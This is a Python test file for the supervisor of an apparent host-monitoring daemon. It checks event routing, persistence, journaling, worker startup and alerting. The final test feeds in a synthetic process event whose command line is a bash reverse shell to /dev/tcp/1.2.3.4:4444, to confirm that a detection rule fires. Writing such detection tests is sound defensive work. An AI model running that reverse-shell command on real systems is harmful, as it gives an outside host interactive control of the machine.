"""Tests for the supervisor."""

from __future__ import annotations

import time
from pathlib import Path

from inspectord.config import dev_config
from inspectord.parsers.base import build_event
from inspectord.storage.db import Database
from inspectord.supervisor import Supervisor


def test_supervisor_starts_and_routes_events(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        deadline = time.monotonic() + 3.0
        events: list[object] = []

        def collect(ev: object) -> None:
            events.append(ev)

        sup.attach_listener(collect)

        while time.monotonic() < deadline and not events:
            time.sleep(0.05)
        assert events, "supervisor did not deliver any events from healthcheck"
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_persists_events_to_db(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        time.sleep(1.5)
    finally:
        sup.stop(timeout=5.0)

    with Database(cfg.storage.db_path) as db:
        rows = db.query("SELECT COUNT(*) FROM events_enriched").fetchall()
    assert rows[0][0] >= 1


def test_supervisor_journals_events(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        time.sleep(1.5)
    finally:
        sup.stop(timeout=5.0)

    assert any(cfg.storage.journal_dir.glob("*.jsonl.gz"))


def test_supervisor_starts_dependency_manager_worker(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        deadline = time.monotonic() + 5.0
        modules: set[str] = set()

        def listener(ev: object) -> None:
            modules.add(getattr(ev, "module", ""))

        sup.attach_listener(listener)

        while time.monotonic() < deadline and "dependency_manager" not in modules:
            time.sleep(0.1)
        assert "dependency_manager" in modules
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_starts_log_tailer_and_fim_watcher(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        names = {wp.spec.name for wp in sup._procs}  # type: ignore[attr-defined]
        assert {"healthcheck", "dependency_manager", "log_tailer", "fim_watcher"} <= names
    finally:
        sup.stop(timeout=5.0)


def test_supervisor_fires_rule_and_notifies_listener(tmp_path: Path) -> None:
    cfg = dev_config(base=tmp_path)
    sup = Supervisor(cfg)
    sup.start()
    try:
        alerts_seen: list[object] = []

        def on_alert(a: object) -> None:
            alerts_seen.append(a)

        sup.attach_alert_listener(on_alert)

        # Wait briefly for setup, then inject a synthetic event.
        time.sleep(0.5)
        ev = build_event(
            module="process_collector",
            action="process_start",
            category=["process"],
            type_=["start"],
            severity="info",
            process={
                "pid": 9999,
                "name": "bash",
                "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            },
        )
        sup._inject_for_test(ev)  # type: ignore[attr-defined]
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline and not alerts_seen:
            time.sleep(0.05)
        assert alerts_seen, "rule did not fire after synthetic event"
    finally:
        sup.stop(timeout=5.0)
